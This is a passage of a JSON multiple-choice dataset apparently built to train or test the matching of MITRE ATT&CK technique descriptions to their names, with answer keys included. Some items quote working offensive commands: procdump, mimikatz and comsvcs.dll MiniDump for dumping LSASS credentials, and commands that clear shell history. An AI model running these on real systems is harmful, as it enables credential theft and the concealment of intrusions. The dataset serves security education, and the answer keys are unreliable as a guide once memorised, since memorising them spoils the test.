      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
      "options": "A. Search Open Technical Databases, B. Defacement: External Defacement, C. Virtualization/Sandbox Evasion: Time Based Evasion, D. Data from Configuration Repository",
      "choice": "C. Virtualization/Sandbox Evasion: Time Based Evasion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).\n\nA. Stage Capabilities: SEO Poisoning, B. Gather Victim Network Information: Network Topology, C. Compromise Accounts, D. Query Registry\nAnswer:",
    "context": "",
    "output": "B. Gather Victim Network Information: Network Topology",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
      "options": "A. Stage Capabilities: SEO Poisoning, B. Gather Victim Network Information: Network Topology, C. Compromise Accounts, D. Query Registry",
      "choice": "B. Gather Victim Network Information: Network Topology",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.\n\nOptions:\nA. Remote Services: Windows Remote Management, B. Abuse Elevation Control Mechanism: Bypass User Account Control, C. Develop Capabilities: Code Signing Certificates, D. Forced Authentication",
    "context": "",
    "output": "B. Abuse Elevation Control Mechanism: Bypass User Account Control",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
      "options": "A. Remote Services: Windows Remote Management, B. Abuse Elevation Control Mechanism: Bypass User Account Control, C. Develop Capabilities: Code Signing Certificates, D. Forced Authentication",
      "choice": "B. Abuse Elevation Control Mechanism: Bypass User Account Control",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).\nA. Valid Accounts: Default Accounts, B. Command and Scripting Interpreter: Visual Basic, C. Hijack Execution Flow: Services File Permissions Weakness, D. System Binary Proxy Execution: Mshta\nAnswer:",
    "context": "",
    "output": "B. Command and Scripting Interpreter: Visual Basic",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "options": "A. Valid Accounts: Default Accounts, B. Command and Scripting Interpreter: Visual Basic, C. Hijack Execution Flow: Services File Permissions Weakness, D. System Binary Proxy Execution: Mshta",
      "choice": "B. Command and Scripting Interpreter: Visual Basic",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \n\nOffice Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations. \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.\n\nPossible answers:\nA. Impair Defenses: Disable or Modify Cloud Firewall, B. Office Application Startup: Office Template Macros, C. Adversary-in-the-Middle: DHCP Spoofing, D. Defacement: External Defacement",
    "context": "",
    "output": "B. Office Application Startup: Office Template Macros",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \n\nOffice Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations. \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
      "options": "A. Impair Defenses: Disable or Modify Cloud Firewall, B. Office Application Startup: Office Template Macros, C. Adversary-in-the-Middle: DHCP Spoofing, D. Defacement: External Defacement",
      "choice": "B. Office Application Startup: Office Template Macros",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).\nA. Data Staged: Remote Data Staging, B. Data Encrypted for Impact, C. Gather Victim Network Information: DNS, D. Forge Web Credentials\nAnswer:",
    "context": "",
    "output": "C. Gather Victim Network Information: DNS",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
      "options": "A. Data Staged: Remote Data Staging, B. Data Encrypted for Impact, C. Gather Victim Network Information: DNS, D. Forge Web Credentials",
      "choice": "C. Gather Victim Network Information: DNS",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.\n\nPossible answers:\nA. Access Token Manipulation: SID-History Injection, B. Compromise Infrastructure: Virtual Private Server, C. Establish Accounts: Cloud Accounts, D. Hijack Execution Flow: Executable Installer File Permissions Weakness",
    "context": "",
    "output": "A. Access Token Manipulation: SID-History Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.",
      "options": "A. Access Token Manipulation: SID-History Injection, B. Compromise Infrastructure: Virtual Private Server, C. Establish Accounts: Cloud Accounts, D. Hijack Execution Flow: Executable Installer File Permissions Weakness",
      "choice": "A. Access Token Manipulation: SID-History Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.\n\nPossible answers:\nA. Obfuscated Files or Information: Compile After Delivery, B. Stage Capabilities: Upload Malware, C. Brute Force: Password Cracking, D. Gather Victim Network Information: Network Trust Dependencies",
    "context": "",
    "output": "A. Obfuscated Files or Information: Compile After Delivery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",
      "options": "A. Obfuscated Files or Information: Compile After Delivery, B. Stage Capabilities: Upload Malware, C. Brute Force: Password Cracking, D. Gather Victim Network Information: Network Trust Dependencies",
      "choice": "A. Obfuscated Files or Information: Compile After Delivery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>\n\nSimilar to Image File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.\n\nPossible answers:\nA. Data Staged, B. Event Triggered Execution: Accessibility Features, C. OS Credential Dumping: LSASS Memory, D. Endpoint Denial of Service",
    "context": "",
    "output": "C. OS Credential Dumping: LSASS Memory",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>\n\nSimilar to Image File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.",
      "options": "A. Data Staged, B. Event Triggered Execution: Accessibility Features, C. OS Credential Dumping: LSASS Memory, D. Endpoint Denial of Service",
      "choice": "C. OS Credential Dumping: LSASS Memory",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.\nA. Valid Accounts, B. Archive Collected Data: Archive via Custom Method, C. Hide Artifacts: File/Path Exclusions, D. Query Registry",
    "context": "",
    "output": "A. Valid Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",
      "options": "A. Valid Accounts, B. Archive Collected Data: Archive via Custom Method, C. Hide Artifacts: File/Path Exclusions, D. Query Registry",
      "choice": "A. Valid Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.\n\nPossible answers:\nA. Data from Network Shared Drive, B. Process Injection: Extra Window Memory Injection, C. Account Manipulation: Additional Cloud Credentials, D. OS Credential Dumping: Security Account Manager",
    "context": "",
    "output": "A. Data from Network Shared Drive",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",
      "options": "A. Data from Network Shared Drive, B. Process Injection: Extra Window Memory Injection, C. Account Manipulation: Additional Cloud Credentials, D. OS Credential Dumping: Security Account Manager",
      "choice": "A. Data from Network Shared Drive",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.\n\nA. Valid Accounts: Local Accounts, B. Boot or Logon Initialization Scripts: Startup Items, C. Boot or Logon Autostart Execution: XDG Autostart Entries, D. Compromise Infrastructure: Virtual Private Server\nA:",
    "context": "",
    "output": "A. Valid Accounts: Local Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
      "options": "A. Valid Accounts: Local Accounts, B. Boot or Logon Initialization Scripts: Startup Items, C. Boot or Logon Autostart Execution: XDG Autostart Entries, D. Compromise Infrastructure: Virtual Private Server",
      "choice": "A. Valid Accounts: Local Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.\n\nA. Obfuscated Files or Information: Dynamic API Resolution, B. Non-Standard Port, C. Office Application Startup: Outlook Rules, D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\nA:",
    "context": "",
    "output": "D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
      "options": "A. Obfuscated Files or Information: Dynamic API Resolution, B. Non-Standard Port, C. Office Application Startup: Outlook Rules, D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "choice": "D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nIn addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session 